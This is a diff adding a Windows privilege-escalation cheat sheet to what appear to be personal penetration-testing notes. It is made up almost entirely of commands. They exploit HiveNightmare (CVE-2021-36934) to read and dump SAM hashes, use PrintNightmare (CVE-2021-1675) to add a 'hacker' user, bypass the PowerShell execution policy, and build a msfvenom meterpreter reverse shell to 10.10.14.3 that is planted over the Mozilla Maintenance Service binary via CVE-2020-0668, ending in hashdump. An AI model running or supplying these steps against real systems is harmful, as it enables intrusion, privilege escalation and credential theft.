@@ -77,3 +77,72 @@ Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerServi
 ```
 Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl
 ```
+
+# Kernel Explotation
+Reconaice tool
+```
+Watson.exe
+```
+## Hashes
+See permissions
+```
+icacls c:\Windows\System32\config\SAM
+```
+Exploit
+```
+.\HiveNightmare.exe
+or
+./CVE-2021-36934.exe
+```
+Extract hashes
+```
+impacket-secretsdump -sam SAM-2021-08-07 -system SYSTEM-2021-08-07 -security SECURITY-2021-08-07 local
+```
+## Spooler Service
+Reconaice
+```
+ls \\localhost\pipe\spoolss
+```
+Ways to [bypass](https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/)
+```
+Set-ExecutionPolicy Bypass -Scope Process
+A
+```
+Create a user
+```
+Import-Module .\CVE-2021-1675.ps1
+Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"
+```
+## Permissions on Binary
+Using this [tool](https://github.com/GhostPack/SharpUp/)
+```
+.\SharpUp.exe audit
+```
+Seeing permissions
+```
+icacls "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
+```
+Revshell
+```
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe > maintenanceservice.exe
+```
+Exploit (don't care about the second name)
+```
+C:\Tools\CVE-2020-0668\CVE-2020-0668.exe C:\Tools\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
+```
+Review of the exploit worked
+```
+icacls 'C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe'
+```
+Uploading the revshell
+```
+copy /Y C:\Tools\maintenanceservice2.exe "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
+```
+Start system
+```
+net start MozillaMaintenance 
+```
+Get hashes
+```
+meterpreter > hashdump
+```
